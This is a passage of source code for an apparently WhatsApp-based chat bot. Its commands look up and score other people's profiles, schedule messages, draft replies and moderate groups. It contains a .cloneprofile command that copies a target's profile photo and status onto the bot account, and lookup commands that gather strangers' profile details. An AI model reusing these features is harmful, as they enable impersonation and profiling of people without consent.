      isBusiness && biz?.email       ? `📧 Biz Email  : ${biz.email}` : null,
      isBusiness && biz?.website?.[0]? `🌐 Website    : ${biz.website[0]}` : null,
      ``,
      `⚡ Scan time  : ${scanMs}ms`,
      line,
    ].filter(x => x !== null).join('\n');

    return lines;
  }

  if (cmd === '.wacheck') {
    const num = (args[0]||'').replace(/\D/g,'');
    if (!num) return '😒 .wacheck <number>\ne.g. .wacheck 2347085331433';

    // Grab any connected WA socket — prefer the bot's own, then any user session
    const botSession = sessions?.get('__bot__');
    const anySession = botSession?.connected ? botSession : (() => {
      for (const [, s] of (sessions||new Map())) { if (s?.connected) return s; }
      return null;
    })();

    if (!anySession?.connected) {
      return '❌ No WhatsApp session is active. Link one with /pair first.';
    }

    const sock = anySession.sock;
    const jid  = num + '@s.whatsapp.net';

    // ── Collect all signal data concurrently ──────────────────────────────
    const [onWA, statusResult, picResult, bizResult] = await Promise.allSettled([
      sock.onWhatsApp(num),
      sock.fetchStatus(jid).catch(()=>null),
      sock.profilePictureUrl(jid, 'image').catch(()=>null),
      sock.getBusinessProfile(jid).catch(()=>null),
    ]);

    // onWhatsApp returns an array; we want the first matching entry
    const waEntry   = onWA.status === 'fulfilled' ? (onWA.value||[])[0] : null;
    const isOnWA    = !!waEntry?.exists;

    // ── Ban / not-found heuristics ────────────────────────────────────────
    // WhatsApp has no public ban API. We make an educated assessment based on
    // what signals are (and aren't) accessible for the number.
    if (!isOnWA) {
      // Extra probe: try fetching the profile pic anyway — banned accounts
      // sometimes still return a pic URL even though onWhatsApp() says false,
      // which hints the account exists but is banned rather than never registered.
      const extraPic = await sock.profilePictureUrl(jid, 'image').catch(()=>null);
      let banVerdict, banDetail;
      if (extraPic) {
        banVerdict = '🚫 *Likely BANNED*';
        banDetail  = 'Not in onWhatsApp() results but profile picture is still accessible — strong indicator of a banned account.';
      } else {
        banVerdict = '❓ *Not on WhatsApp*';
        banDetail  = 'Number not found and no profile accessible. Could be:\n  • Account permanently banned by WhatsApp\n  • Number deleted/deactivated by the user\n  • Never registered on WhatsApp\n\nWhatsApp does not expose the reason externally.';
      }
      return [
        `🔍 *WA NUMBER CHECK*`,
        `📱 Number: +${num}`,
        ``,
        banVerdict,
        banDetail,
        ``,
        `ℹ️ WhatsApp does not share ban reasons with third parties.`,
        `If this was your number, contact WhatsApp support at support.whatsapp.com`,
      ].join('\n');
    }

    const status    = statusResult.status  === 'fulfilled' ? statusResult.value  : null;
    const picUrl    = picResult.status     === 'fulfilled' ? picResult.value     : null;
    const bizInfo   = bizResult.status     === 'fulfilled' ? bizResult.value     : null;

    // ── Score each signal ─────────────────────────────────────────────────
    // Each factor adds to a 100-pt pool and is explained in the report
    let score = 0;
    const factors = [];

    // 1. Exists on WhatsApp (+30 — mandatory base)
    score += 30;
    factors.push({ label: '✅ Registered on WhatsApp', pts: 30, detail: 'Number is active on WhatsApp' });

    // 2. Has a profile picture (+20)
    if (picUrl) {
      score += 20;
      factors.push({ label: '🖼️ Profile picture set', pts: 20, detail: 'Account has a visible profile photo' });
    } else {
      factors.push({ label: '🚫 No profile picture', pts: 0, detail: 'No photo — freshly made or privacy locked' });
    }

    // 3. Has a non-empty status/about (+15)
    const hasStatus = !!(status?.status && status.status.trim().length > 0);
    if (hasStatus) {
      score += 15;
      factors.push({ label: '💬 About/status set', pts: 15, detail: `"${status.status.slice(0,40)}${status.status.length>40?'…':''}"` });
    } else {
      factors.push({ label: '💬 No about/status', pts: 0, detail: 'Blank about — new or stripped account' });
    }

    // 4. Status was updated recently (+10): WhatsApp includes setAt timestamp
    const statusAge = status?.setAt ? (Date.now()/1000 - status.setAt) : null;
    if (statusAge !== null && statusAge < 60*60*24*30) { // set within last 30 days
      score += 10;
      factors.push({ label: '🕒 Status recently updated', pts: 10, detail: `Updated ${Math.floor(statusAge/86400)} day(s) ago` });
    } else if (statusAge !== null) {
      factors.push({ label: '🕒 Status is stale', pts: 0, detail: `Last updated ${Math.floor(statusAge/86400)} day(s) ago` });
    }

    // 5. Business profile (+15)
    const isBusiness = !!(bizInfo?.description || bizInfo?.email || bizInfo?.website?.length);
    if (isBusiness) {
      score += 15;
      factors.push({ label: '🏢 Business account', pts: 15, detail: bizInfo.description ? `"${bizInfo.description.slice(0,40)}"` : 'Verified business profile' });
    } else {
      factors.push({ label: '👤 Personal account', pts: 0, detail: 'Not a WhatsApp Business account' });
    }

    // 6. Business website (+10 bonus)
    if (bizInfo?.website?.length) {
      score += 10;
      factors.push({ label: '🌐 Business website listed', pts: 10, detail: bizInfo.website[0] });
    }

    // Cap at 100
    score = Math.min(score, 100);

    // ── Strength tier ─────────────────────────────────────────────────────
    let tier, tierEmoji, tierDesc;
    if      (score >= 80) { tier = 'VERY STRONG'; tierEmoji = '🟢'; tierDesc = 'Established, active account with a full profile.'; }
    else if (score >= 60) { tier = 'STRONG';      tierEmoji = '🔵'; tierDesc = 'Active account with a decent profile presence.'; }
    else if (score >= 40) { tier = 'MODERATE';    tierEmoji = '🟡'; tierDesc = 'Some profile setup but missing key signals.'; }
    else if (score >= 20) { tier = 'WEAK';         tierEmoji = '🟠'; tierDesc = 'Minimal presence — likely new or burner account.'; }
    else                  { tier = 'VERY WEAK';   tierEmoji = '🔴'; tierDesc = 'Bare registration only. Very likely a fresh/spam number.'; }

    // ── Visual bar ────────────────────────────────────────────────────────
    const filled  = Math.round(score / 10);
    const empty   = 10 - filled;
    const bar     = '█'.repeat(filled) + '░'.repeat(empty);

    // ── Build report ──────────────────────────────────────────────────────
    const factorLines = factors.map(f =>
      `  ${f.label} (+${f.pts}pt${f.pts!==1?'s':''})\n   └─ ${f.detail}`
    ).join('\n');

    return [
      `📊 *WA PROFILE STRENGTH REPORT*`,
      `📱 Number: +${num}`,
      ``,
      `${tierEmoji} *${tier}* — ${score}/100`,
      `[${bar}]`,
      `${tierDesc}`,
      ``,
      `📋 BREAKDOWN:`,
      factorLines,
      ``,
      `ℹ️ Score is based on publicly visible profile signals.`,
    ].join('\n');
  }


  // ════════════════════════════════════════════════════════════════════════
  // ★  PREMIUM FEATURES
  // ════════════════════════════════════════════════════════════════════════

  // Grab any live WA socket (bot's own preferred, then any user session)
  function getAnyWaSock() {
    const b = sessions?.get('__bot__');
    if (b?.connected) return { sock: b.sock, sessionId: '__bot__' };
    for (const [id, s] of (sessions||new Map())) {
      if (s?.connected) return { sock: s.sock, sessionId: id };
    }
    return null;
  }
  function getUserWaSock(rawUid) {
    const tgId = (rawUid||'').replace('tg_','');
    const s = sessions?.get(tgId);
    if (s?.connected) return { sock: s.sock, sessionId: tgId };
    return getAnyWaSock();
  }



  // ── 3. .autoreply — keyword auto-reply triggers ───────────────────────────
  if (cmd === '.autoreply') {
    const sub = (args[0]||'').toLowerCase();
    if (sub === 'add') {
      const rest = args.slice(1).join(' ');
      const pipeIdx = rest.indexOf('|');
      if (pipeIdx < 0) return '😒 .autoreply add <trigger> | <response>\ne.g. .autoreply add hi | Hello! How can I help?';
      const trigger  = rest.slice(0, pipeIdx).trim().toLowerCase();
      const response = rest.slice(pipeIdx + 1).trim();
      if (!trigger || !response) return '😒 Both trigger and response required.';
      const max = isSudo(userId) ? 50 : 10;
      const count = db.prepare('SELECT COUNT(*) as c FROM autoreplies WHERE owner_id=?').get(userId).c;
      if (count >= max) return `😒 You have ${count}/${max} autoreplies. Delete some with .autoreply del <id>.`;
      db.prepare('INSERT INTO autoreplies (owner_id, trigger, response) VALUES (?,?,?)').run(userId, trigger, response);
      return `✅ Autoreply added!\nTrigger: "${trigger}"\nResponse: "${response}"`;
    }
    if (sub === 'list') {
      const rows = db.prepare('SELECT id, trigger, response, active FROM autoreplies WHERE owner_id=? ORDER BY id').all(userId);
      if (!rows.length) return `💕 No autoreplies set.\n.autoreply add <trigger> | <response> to add one.`;
      const lines = rows.map(r => `[${r.id}] ${r.active?'✅':'❌'} "${r.trigger}" → "${r.response.slice(0,30)}${r.response.length>30?'…':''}"`);
      return `💕 *YOUR AUTOREPLIES* (${rows.length})\n\n${lines.join('\n')}\n\n.autoreply del <id> | toggle <id> | clear`;
    }
    if (sub === 'del') {
      const id = parseInt(args[1]);
      if (!id) return '😒 .autoreply del <id>';
      const row = db.prepare('SELECT id FROM autoreplies WHERE id=? AND owner_id=?').get(id, userId);
      if (!row) return `❌ Autoreply #${id} not found.`;
      db.prepare('DELETE FROM autoreplies WHERE id=?').run(id);
      return `✅ Autoreply #${id} deleted.`;
    }
    if (sub === 'toggle') {
      const id = parseInt(args[1]);
      if (!id) return '😒 .autoreply toggle <id>';
      const row = db.prepare('SELECT id, active FROM autoreplies WHERE id=? AND owner_id=?').get(id, userId);
      if (!row) return `❌ Autoreply #${id} not found.`;
      const nv = row.active ? 0 : 1;
      db.prepare('UPDATE autoreplies SET active=? WHERE id=?').run(nv, id);
      return `${nv ? '✅ Enabled' : '❌ Disabled'} autoreply #${id}.`;
    }
    if (sub === 'clear') {
      const count = db.prepare('SELECT COUNT(*) as c FROM autoreplies WHERE owner_id=?').get(userId).c;
      if (!count) return '😒 No autoreplies to clear.';
      db.prepare('DELETE FROM autoreplies WHERE owner_id=?').run(userId);
      return `✅ Cleared all ${count} autoreplies.`;
    }
    return `💕 *AUTOREPLY*\n\n.autoreply add <kw> | <reply>  — add trigger\n.autoreply list                — view all\n.autoreply del <id>            — remove one\n.autoreply toggle <id>         — enable/disable\n.autoreply clear               — remove all`;
  }

  // ── 4. .schedule / .myscheduled / .cancelschedule ────────────────────────
  if (cmd === '.schedule') {
    const wa = getUserWaSock(rawUserId);
    if (!wa) return '❌ No WhatsApp session active. Link with /pair first.';
    if (!args[0]) return [
      `⏰ *SCHEDULE A MESSAGE*`,
      `.schedule <number> <delay> <message>`,
      `Delay: 30s, 5m, 2h (max 24h)`,
      `Example: .schedule 2347085331433 10m Hey!`,
      `.myscheduled — view pending`,
      `.cancelschedule <id> — cancel`,
    ].join('\n');
    const num   = (args[0]||'').replace(/\D/g,'');
    const delay = (args[1]||'').toLowerCase();
    const msg   = args.slice(2).join(' ');
    if (!num || num.length < 7) return '😒 Invalid number. Include country code.';
    if (!delay || !msg) return '😒 .schedule <number> <delay> <message>';
    const match = delay.match(/^(\d+)(s|m|h)$/);
    if (!match) return '😒 Delay format: 30s, 5m, 2h';
    const [, val, unit] = match;
    const ms = parseInt(val) * { s: 1000, m: 60000, h: 3600000 }[unit];
    if (ms > 86400000) return '😒 Max delay is 24h.';
    if (ms < 5000)     return '😒 Min delay is 5s.';
    const fireAt = Date.now() + ms;
    const toJid  = num + '@s.whatsapp.net';
    const rowId  = db.prepare('INSERT INTO scheduled_msgs (owner_id, wa_session_id, to_jid, message, fire_at) VALUES (?,?,?,?,?)').run(userId, wa.sessionId, toJid, msg, fireAt).lastInsertRowid;
    setTimeout(async () => {
      try {
        const live = sessions?.get(wa.sessionId);
        if (live?.connected) await live.sock.sendMessage(toJid, { text: msg });
        else console.log(`[schedule #${rowId}] session offline at fire time`);
      } catch(e) { console.error(`[schedule #${rowId}]`, e.message); }
      finally { db.prepare('UPDATE scheduled_msgs SET fired=1 WHERE id=?').run(rowId); }
    }, ms);
    const hd = `${val}${unit==='s'?' second':unit==='m'?' minute':' hour'}${parseInt(val)!==1?'s':''}`;
    return `⏰ *Scheduled!*\n📱 To: +${num}\n🕒 In: ${hd}\n💬 "${msg.slice(0,60)}${msg.length>60?'…':''}"\nID: #${rowId} — .cancelschedule ${rowId} to cancel.`;
  }
  if (cmd === '.myscheduled') {
    const rows = db.prepare('SELECT id, to_jid, message, fire_at FROM scheduled_msgs WHERE owner_id=? AND fired=0 ORDER BY fire_at ASC').all(userId);
    if (!rows.length) return '⏰ No pending scheduled messages.';
    const now = Date.now();
    const lines = rows.map(r => {
      const num   = r.to_jid.replace('@s.whatsapp.net','');
      const inSec = Math.max(0, Math.round((r.fire_at - now)/1000));
      const eta   = inSec>=60 ? `${Math.floor(inSec/60)}m ${inSec%60}s` : `${inSec}s`;
      return `#${r.id} → +${num} in ${eta}\n   "${r.message.slice(0,40)}${r.message.length>40?'…':''}"`;
    });
    return `⏰ *PENDING* (${rows.length})\n\n${lines.join('\n\n')}\n\n.cancelschedule <id> to cancel`;
  }
  if (cmd === '.cancelschedule') {
    const id = parseInt(args[0]);
    if (!id) return '😒 .cancelschedule <id>';
    const row = db.prepare('SELECT id, fired FROM scheduled_msgs WHERE id=? AND owner_id=?').get(id, userId);
    if (!row)      return `❌ Scheduled message #${id} not found.`;
    if (row.fired) return `❌ Message #${id} was already sent.`;
    db.prepare('UPDATE scheduled_msgs SET fired=1 WHERE id=?').run(id);
    return `✅ Cancelled scheduled message #${id}.`;
  }

  // ── 5. .wainfo <number> — full account detail card ────────────────────────
  if (cmd === '.wainfo') {
    const num = (args[0]||'').replace(/\D/g,'');
    if (!num) return '😒 .wainfo <number>\ne.g. .wainfo 2347085331433';
    const wa = getAnyWaSock();
    if (!wa) return '❌ No WhatsApp session active.';
    const jid = num + '@s.whatsapp.net';
    const [onWA, statusRes, picRes, bizRes] = await Promise.allSettled([
      wa.sock.onWhatsApp(num),
      wa.sock.fetchStatus(jid).catch(()=>null),
      wa.sock.profilePictureUrl(jid, 'image').catch(()=>null),
      wa.sock.getBusinessProfile(jid).catch(()=>null),
    ]);
    const waEntry = onWA.status==='fulfilled' ? (onWA.value||[])[0] : null;
    const status  = statusRes.status==='fulfilled' ? statusRes.value : null;
    const picUrl  = picRes.status==='fulfilled' ? picRes.value : null;
    const biz     = bizRes.status==='fulfilled' ? bizRes.value : null;
    const isOnWA  = !!waEntry?.exists;
    const lines = [
      `📇 *WA ACCOUNT INFO*`,
      `📱 +${num}`,
      ``,
      `Status:  ${isOnWA ? '✅ Active on WhatsApp' : '🚫 Not found / Banned'}`,
      `Photo:   ${picUrl ? '🖼️ Has profile picture' : '❌ No profile picture'}`,
    ];
    if (status?.status) {
      const age = status.setAt ? Math.floor((Date.now()/1000 - status.setAt)/86400) : null;
      lines.push(`About:   "${status.status.slice(0,60)}${status.status.length>60?'…':''}"`);
      if (age !== null) lines.push(`         (set ${age} day${age!==1?'s':''} ago)`);
    } else {
      lines.push(`About:   — (none or private)`);
    }
    if (biz?.description || biz?.email || biz?.website?.length) {
      lines.push(``, `🏢 *BUSINESS ACCOUNT*`);
      if (biz.description) lines.push(`Desc:    ${biz.description.slice(0,80)}`);
      if (biz.email)       lines.push(`Email:   ${biz.email}`);
      if (biz.website?.[0]) lines.push(`Web:     ${biz.website[0]}`);
      if (biz.category)    lines.push(`Cat:     ${biz.category}`);
    } else {
      lines.push(`Type:    👤 Personal account`);
    }
    if (picUrl) lines.push(``, `🔗 ${picUrl.slice(0,80)}…`);
    return lines.join('\n');
  }

  // ── 6. .cloneprofile <number> — copy their WA profile to the bot account ──
  if (cmd === '.cloneprofile') {
    if (!isOwner(userId)) return '❌ Owner only.';
    const num = (args[0]||'').replace(/\D/g,'');
    if (!num) return '😒 .cloneprofile <number>';
    const wa = sessions?.get('__bot__');
    if (!wa?.connected) return '❌ My WhatsApp session is not connected.';
    const jid = num + '@s.whatsapp.net';
    try {
      const [statusRes, picRes] = await Promise.allSettled([
        wa.sock.fetchStatus(jid).catch(()=>null),
        wa.sock.profilePictureUrl(jid, 'image').catch(()=>null),
      ]);
      const status = statusRes.status==='fulfilled' ? statusRes.value : null;
      const picUrl = picRes.status==='fulfilled' ? picRes.value : null;
      const done = [];
      if (status?.status) {
        await wa.sock.updateProfileStatus(status.status);
        done.push(`✅ Status: "${status.status.slice(0,40)}"`);
      }
      if (picUrl) {
        const res = await axios.get(picUrl, { responseType: 'arraybuffer' });
        await wa.sock.updateProfilePicture(wa.sock.user.id, Buffer.from(res.data));
        done.push(`✅ Profile picture cloned`);
      }
      return done.length
        ? `🪞 *Cloned from +${num}*\n\n${done.join('\n')}`
        : `😒 Nothing to clone from +${num}.`;
    } catch(e) { return `❌ Clone error: ${e.message}`; }
  }

  // ── 7. .broadcast <message> — send to all known WA contacts ──────────────
  if (cmd === '.broadcast') {
    return 'Broadcast is turned off. Mass messaging is the fastest way to get a WhatsApp number banned.';
  }
  if (false && cmd === '.broadcast') {
    if (!isSudo(userId)) return '❌ Sudo/owner only.';
    const wa = getUserWaSock(rawUserId);
    if (!wa) return '❌ No WhatsApp session active.';
    const msg = args.join(' ');
    if (!msg) return '😒 .broadcast <message>';
    const contacts = db.prepare('SELECT DISTINCT to_jid FROM scheduled_msgs WHERE owner_id=? AND fired=1 LIMIT 50').all(userId);
    if (!contacts.length) return `😒 No contacts in history. Use .schedule first to register contacts.`;
    let sent = 0, failed = 0;
    for (const c of contacts) {
      try { await wa.sock.sendMessage(c.to_jid, { text: `📢 ${msg}` }); sent++; await sleep(1200); }
      catch(_) { failed++; }
    }
    return `📢 *Broadcast done!*\n✅ Sent: ${sent}\n❌ Failed: ${failed}`;
  }

  // ── 9. AI TOOLS ──────────────────────────────────────────────────────────
  if (cmd === '.aidraft') {
    const msgText = args.join(' ');
    if (!msgText) return '😒 .aidraft <the message you received>\nI\'ll suggest how to reply.';
    const draft = await chat(userId, `[Someone sent you this message: "${msgText}". Draft 3 different reply options — short, medium, witty — in your own voice. Number them 1., 2., 3.]`);
    return `✍️ *REPLY DRAFTS*\n\nFor: "${msgText.slice(0,50)}${msgText.length>50?'…':''}"\n\n${draft}`;
  }

  if (cmd === '.aistatus') {
    const mood = args.join(' ') || 'unbothered and doing well';
    const status = await chat(userId, `[Generate a creative, short WhatsApp status (max 50 chars) for someone who is: "${mood}". Write it in your own warm, cute voice. Just the status text, nothing else.]`);
    return `✨ *AI STATUS*\n\n"${(status||'living. quietly.').replace(/"/g,'').trim()}"\n\n.aistatus <mood> to generate another.`;
  }

  if (cmd === '.ainame') {
    const theme = args.join(' ') || 'cool and mysterious';
    const names = await chat(userId, `[Generate 5 creative, unique username ideas for someone who is: "${theme}". Make them cute, creative and memorable. List them numbered 1-5. No explanation, just the names.]`);
    return `💡 *USERNAME IDEAS*\n\nTheme: ${theme}\n\n${names||'sweet.seana\nmoon.honey\nsunny.shay\nvelvet.vibes\ncloud.nine'}`;
  }

  if (cmd === '.rephrase') {
    const txt = args.join(' ');
    if (!txt) return '😒 .rephrase <text>\nI\'ll rewrite it in my style.';
    const rephrased = await chat(userId, `[Rephrase this text in your own voice, so it sounds warm, natural and unmistakably like you wrote it: "${txt}". Just give the rephrased version, no explanation.]`);
    return `🔄 *REPHRASE*\n\nOriginal: "${txt.slice(0,60)}"\n\nRewritten: "${(rephrased||txt).trim()}"`;
  }

  // ── 10. STEALTH MODE ──────────────────────────────────────────────────────



  // ── 13. ANTI-FLOOD ────────────────────────────────────────────────────────
  if (cmd === '.antiflood') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '😒 .antiflood on/off';
    try { db.exec("ALTER TABLE group_settings ADD COLUMN antiflood_on INTEGER DEFAULT 0"); } catch(_){}
    setGroupSetting(chatId, 'antiflood_on', val==='on'?1:0);
    return `🌊 Anti-flood turned ${val}.` + (val === 'on' ? botAdminNote() : '');
  }

  // ── 14. OWNER TOOLS ───────────────────────────────────────────────────────
  if (cmd === '.clearhistory') {
    if (!isOwner(rawUserId||userId)) return '❌ owner only.';
    const count = Object.keys(userHistory).length;
    for (const k of Object.keys(userHistory)) delete userHistory[k];
    saveHistorySoon();
    return `🧹 cleared ${count} chat histories.`;
  }
  if (cmd === '.dbstats') {
    if (!isOwner(rawUserId||userId)) return '❌ owner only.';
    const users=db.prepare('SELECT COUNT(*) as c FROM users').get().c;
    const notes=db.prepare('SELECT COUNT(*) as c FROM notes').get().c;
    const scheduled=db.prepare('SELECT COUNT(*) as c FROM scheduled_msgs WHERE fired=0').get().c;
    const polls=db.prepare('SELECT COUNT(*) as c FROM polls WHERE closed=0').get().c;
    const invests=db.prepare('SELECT COUNT(*) as c FROM investments WHERE claimed=0').get().c;
    const totalNaura=db.prepare('SELECT SUM(cash+bank) as t FROM users').get().t||0;
    return `📊 *DATABASE STATS*\n\n👥 Users: ${users}\n📝 Notes: ${notes}\n⏰ Pending scheduled: ${scheduled}\n📊 Open polls: ${polls}\n📈 Active investments: ${invests}\n\n💰 Total naura in economy: ${fmt(totalNaura)}\n💕 AI history keys: ${Object.keys(userHistory).length}`;
  }

  // ── GROUP SETTINGS (text-only, no platform API needed) ──
  if (cmd === '.rules') {
    const s = getGroupSettings(chatId);
    return s.rules ? `📋 GROUP RULES\n\n${s.rules}` : '📋 No rules set yet. Admins use .setrules <text>';
  }
  if (cmd === '.setrules') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const txt = args.join(' ');
    if (!txt) return '😒 .setrules <rules text>';
    setGroupSetting(chatId, 'rules', txt.slice(0, 1000));
    return '📋 Group rules updated.';
  }
  if (cmd === '.welcome') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '😒 .welcome on/off';
    setGroupSetting(chatId, 'welcome_on', val === 'on' ? 1 : 0);
    return `🎉 Welcome messages turned ${val}.`;
  }
  if (cmd === '.setwelcome') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const txt = args.join(' ');
    if (!txt) return '😒 .setwelcome <message> — use {name} for the member, {group} for the group name, {count} for member number';
    setGroupSetting(chatId, 'welcome_msg', txt.slice(0, 500));
    return '🎉 Welcome message set. (Use .welcome on to enable)';
  }
  if (cmd === '.goodbye') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '👋 .goodbye on/off';
    setGroupSetting(chatId, 'goodbye_on', val === 'on' ? 1 : 0);
    return `👋 Goodbye messages turned ${val}.`;
  }
  if (cmd === '.setgoodbye') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const txt = args.join(' ');
    if (!txt) return '👋 .setgoodbye <message> — use {name} for the member, {group} for the group name, {count} for member number\nExample: .setgoodbye 👋 {name} has left the building.';
    setGroupSetting(chatId, 'goodbye_msg', txt.slice(0, 500));
    return '👋 Goodbye message set. (Use .goodbye on to enable)';
  }
  if (cmd === '.antibot' || cmd === '.nobot') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    if (!String(chatId).endsWith('@g.us')) return '😒 use this inside a WhatsApp group.';
    const val = (args[0] || '').toLowerCase();
    const cur = getGroupSettings(chatId);
    if (!val || val === 'status') {
      const _abLim = gtWarnLimit(chatId);
      return `🚫 *NO-BOT (Block 3rd-Party Bots)*\n\nStatus: ${cur.antibot_on ? '✅ ON' : '❌ OFF'}\n\n` +
        `When ON, *no member (except admins) is allowed to use a bot* inside this group.\n` +
        `If a non-admin member is detected using a third-party WhatsApp bot, they get a *warning*.\n` +
        `After *${_abLim} warning${_abLim !== 1 ? 's' : ''}* they are automatically *removed*.\n\n` +
        `✅ Admins are always exempt.\n` +
        `Warnings stack with other mod actions and respect .warnlimit (currently ${_abLim}).\n\n` +
        `.antibot on — enable\n.antibot off — disable\n\n` +
        `⚠️ I must be a group admin for this to work.` + botAdminNote();
    }
    if (!['on', 'off'].includes(val)) return '😒 .antibot on/off';
    setGroupSetting(chatId, 'antibot_on', val === 'on' ? 1 : 0);
    if (val === 'on') {
      const _abLim = gtWarnLimit(chatId);
      return `🚫 *No-Bot turned ON.*\n\nNo member (except admins) may use a third-party WhatsApp bot in this group.\nFirst offence → *warning*. After ${_abLim} warning${_abLim !== 1 ? 's' : ''} → *removed*.\n\n(Warn limit follows .warnlimit — currently ${_abLim})` + botAdminNote();
    }
    return `🚫 No-Bot turned OFF. Members may now use bots freely.`;
  }
  if (cmd === '.antilink') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '😒 .antilink on/off';
    setGroupSetting(chatId, 'antilink_on', val === 'on' ? 1 : 0);
    return `🔗 Anti-link turned ${val}. Only admins can send links.` + (val === 'on' ? botAdminNote() : '');
  }
  if (cmd === '.antigm') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '😒 .antigm on/off';
    setGroupSetting(chatId, 'antigm_on', val === 'on' ? 1 : 0);
    return `👥 Anti-group-mention turned ${val}. Group tags/mentions will be ${val === 'on' ? 'deleted' : 'allowed'}.` + (val === 'on' ? botAdminNote() : '');
  }
  if (cmd === '.antigcall') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    if (!String(chatId).endsWith('@g.us')) return '😒 use this inside a WhatsApp group.';
    const val = (args[0] || '').toLowerCase();
    const cur = kvGet('antigcall_' + chatId) || 'off';
    const lim = gtWarnLimit(chatId);
    const label = m => m === 'off' ? 'OFF' : m === 'warn' ? 'ON (warn only, nobody is removed)' : m === 'kick' ? 'ON (removed on the first call)' : `ON (${lim} warnings, then removed)`;
    if (!['on', 'off', 'warn', 'kick', 'instant'].includes(val)) return `📵 *ANTI GROUP CALL*\nstatus: ${label(cur)}\n\n.antigcall on — warn each time, remove after ${lim} warnings\n.antigcall instant — remove on the first group call\n.antigcall warn — only warn, never remove\n.antigcall off — allow group calls\n\nChange the number of warnings with .warnlimit <1-10>. Admins, sudo users and the owner are exempt.`;
    const mode = val === 'off' ? 'off' : val === 'warn' ? 'warn' : (val === 'kick' || val === 'instant') ? 'kick' : 'strike';
    kvSet('antigcall_' + chatId, mode);
    return `📵 Anti group call is ${label(mode)}.` + (mode === 'strike' || mode === 'kick' ? botAdminNote() : '') + (mode !== 'off' ? '\nNote: I can decline the call on my side, but WhatsApp does not let a bot end a call for everyone else.' : '');
  }
  if (cmd === '.antipicture' || cmd === '.antivideo' || cmd === '.antiviewonce') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    if (!String(chatId).endsWith('@g.us')) return '😒 use this inside a WhatsApp group.';
    const pic = kvGet('antipicture_' + chatId) === '1', vid = kvGet('antivideo_' + chatId) === '1';
    const val = (args[0] || '').toLowerCase();
    if (!['on', 'off'].includes(val)) return `🖼️ *ANTI MEDIA*\npictures: ${pic ? 'ON' : 'OFF'}\nvideos: ${vid ? 'ON' : 'OFF'}\n\n.antipicture on/off — delete normal pictures (view-once allowed)\n.antivideo on/off — delete normal videos (view-once allowed)\n.antiviewonce on/off — both at once\n\nMembers must use view-once to share media. Admins, sudo users and the owner are exempt.`;
    const v = val === 'on' ? '1' : '0';
    if (cmd !== '.antivideo') kvSet('antipicture_' + chatId, v);
    if (cmd !== '.antipicture') kvSet('antivideo_' + chatId, v);
    const what = cmd === '.antipicture' ? 'pictures' : cmd === '.antivideo' ? 'videos' : 'pictures and videos';
    return `🖼️ Anti ${what}: ${val.toUpperCase()}. ` + (val === 'on' ? `Normal ${what} will be deleted — members must use view-once.${botAdminNote()}` : `${what.charAt(0).toUpperCase() + what.slice(1)} are allowed again.`);
  }
  if (cmd === '.antichannel') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    if (!String(chatId).endsWith('@g.us')) return '😒 use this inside a WhatsApp group.';
    const val = (args[0] || '').toLowerCase();
    const on = kvGet('antichannel_' + chatId) === '1';
    if (!['on', 'off'].includes(val)) return `📢 *ANTI CHANNEL*\nstatus: ${on ? 'ON' : 'OFF'}\n\n.antichannel on — delete posts forwarded from WhatsApp Channels (warning each time, removed at the warn limit)\n.antichannel off — allow them\n\nAdmins, sudo users and the owner are exempt.`;
    kvSet('antichannel_' + chatId, val === 'on' ? '1' : '0');
    return `📢 Anti-channel turned ${val}. Channel forwards from members will be ${val === 'on' ? 'deleted with a warning' : 'allowed'}.` + (val === 'on' ? botAdminNote() : '');
  }
  if (cmd === '.antistatus') {
    if (!isGroupMod(userId)) return '❌ admins/sudo only.';
    const val = (args[0]||'').toLowerCase();
    if (!['on','off'].includes(val)) return '📛 .antistatus on/off\nWhen ON, anyone who posts to the group status or tags the group in a status is removed at once, with everything they posted deleted. No warning. Admins are exempt, and I must be an admin.';
    setGroupSetting(chatId, 'antistatus_on', val === 'on' ? 1 : 0);
    return `📛 Anti-status-tag turned ${val}. ${val === 'on' ? 'Status mention messages will be silently deleted.' : 'Status mentions are now allowed.'}` + (val === 'on' ? botAdminNote() : '');
  }
  if (['.autoapprove', '.autoreject', '.markgood', '.markbad', '.unmark', '.marklist'].includes(cmd)) {
    const _jc = _selfCtx.getStore() || {};
    // Allow: sudo/owner, the linked account owner, or a group admin
    const _jrSk = await (async () => { try { return await jrFindSock(chatId); } catch (_) { return null; } })();
    let _callerIsGroupAdmin = false;
    if (_jrSk && String(chatId).endsWith('@g.us')) {
      try {
        const _jrMeta = await gtWaMeta(_jrSk, chatId, true);
        // userId is like 'wa_2347068176645'; build the JID variants the admin list might use
        const _digits = userId.replace(/^wa_/, '').replace(/\D/g, '');
        _callerIsGroupAdmin = !!_jrMeta?.participants?.some(p => {
          const pd = String(p.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
          return pd === _digits && (p.admin === 'admin' || p.admin === 'superadmin');
        });
      } catch (_) {}
    }
    if (!(isSudo(userId) || _jc.linked || _callerIsGroupAdmin)) return '💗 only the owner or a group admin can control who joins.';
    if (!String(chatId).endsWith('@g.us')) return '💗 use this inside a WhatsApp group.';
    const sk = await jrFindSock(chatId);
    if (!sk) return '❌ I could not reach the WhatsApp bot for this group.';
    const gs0 = getGroupSettings(chatId);

    if (cmd === '.autoapprove' || cmd === '.autoreject') {
      const want = cmd === '.autoapprove' ? 'approve' : 'reject';
      const val = (args[0] || '').toLowerCase();
      if (!['on', 'off'].includes(val)) {
